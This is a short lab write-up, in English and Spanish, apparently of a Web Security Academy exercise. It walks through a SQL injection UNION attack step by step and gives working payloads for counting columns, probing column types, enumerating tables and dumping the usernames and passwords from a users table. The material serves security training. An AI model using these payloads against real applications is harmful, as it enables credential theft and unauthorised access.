---
title: "Lab: SQL injection UNION attack, retrieving data from other tables"
date: 2025-12-22
category: "SQL Injection"
order: 6
tags: ["web-security-academy", "sql-injection", "lab", "union"]
layout: layouts/writeup.njk
permalink: /writeups/sql-injection-lab-union-retrieving-data-other-tables.html
---

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

---

## Paso 1 — Determinar el número de columnas

```sql
'ORDER BY 1--
'ORDER BY 2--
'ORDER BY 3-- → Error → tiene 3-1 = 2 columnas
```

## Paso 2 — Determinar el tipo de dato de cada columna

Cuando da error significa que esa columna no es de ese tipo de dato:

```sql
' UNION SELECT 'a', NULL-- → No error → columna 1 es str
' UNION SELECT NULL, 'a'-- → No error → columna 2 es str
```

## Paso 3 — Ver las tablas disponibles

En este ejercicio el enunciado ya indica los nombres de tabla y columnas, pero si no se supieran se podría ejecutar:

```sql
' UNION SELECT table_name, 'a' FROM information_schema.tables--
```

## Paso 4 — Extraer usuarios y contraseñas ✅

Con las dos columnas confirmadas como string, y sabiendo que la tabla `users` tiene columnas `username` y `password`:

```sql
' UNION SELECT username, password FROM users--
```

Esto retorna todos los usernames y contraseñas de la tabla `users` en la respuesta de la aplicación. Con las credenciales del usuario `administrator` obtenidas, se inicia sesión con ellas. Lab resuelto.

> Si el número de columnas disponibles no alcanzara para mostrar ambos campos por separado, se pueden concatenar en una sola columna dentro del mismo query.
